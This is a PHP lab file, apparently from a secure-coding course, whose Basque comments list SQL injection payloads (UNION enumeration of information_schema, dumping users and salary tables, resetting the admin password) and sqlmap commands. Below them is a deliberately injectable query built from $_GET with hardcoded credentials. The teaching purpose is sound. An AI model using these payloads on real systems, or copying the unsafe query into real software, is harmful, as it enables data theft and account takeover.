<?php

/*
sql injection:

' OR '1'='1
' OR 1=1--'

https://portswigger.net/web-security/sql-injection/examining-the-database
https://portswigger.net/web-security/sql-injection/union-attacks

' UNION SELECT @@version, null, null '
' UNION SELECT @@version, null, null; #'
' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables; #'
' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables where TABLE_SCHEMA='sql_injection'; #'
' UNION SELECT table_name, column_name, null FROM information_schema.columns where TABLE_SCHEMA='sql_injection'; #'
' UNION select * from users; #'
' OR '1'='1' UNION select *, null from salary; #'

'; UPDATE users SET pass='aldatua' WHERE user='admin'; #'  EZ DABIL multiple sql semicolon erabiliz PHP-k ez du uzten, irakurri https://www.php.net/manual/en/function.mysql-query.php

***********
sqlmap.org

$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

GET
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --banner
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --passwords
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dbs
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --tables -D [database]
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dump -T [table] -D [database] 

POST
post-request.txt fitxategia sortu: firefox->F12->network->HTML, POST lerroaren gainean: copy request headers eta copy POST data:

***
POST /workspace/secure-coding/02-Injection/01-loginapp/user_info.php HTTP/1.1
Host: 3.136.97.33
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: ...
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://3.136.97.33
Connection: keep-alive
Referer: http://3.136.97.33/workspace/secure-coding/02-Injection/01-loginapp/user_info.html
Upgrade-Insecure-Requests: 1

user=kkkk
***

$ python sqlmap.py -r post-request.txt
$ python sqlmap.py -r post-request.txt --dbs
...


***********

Zer egin konpontzeko?
https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/
https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php

*/

$servername = "localhost";
$username = "koxme";
$password = "pasahitza";
$dbname = "sql_injection";

// Create connection
$conn = new mysqli($servername, $username, $password,$dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

//echo "Connected successfully";

// formulariotik bidalitako datuak irakurri
// leer desde el formulario

$user =  $_GET['user'];
//$user =  $_POST['user'];

//
$sql = "SELECT * FROM users WHERE user = '$user'";
echo $sql . "<br>";

$result = $conn->query($sql);

if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        print_r($row);
        //echo "Erabiltzailea: " . $row["user"] . " // admin da?: " . $row["admin"];
        echo "<br>";
    }
} else {
    echo "0 results";
}

$conn->close();
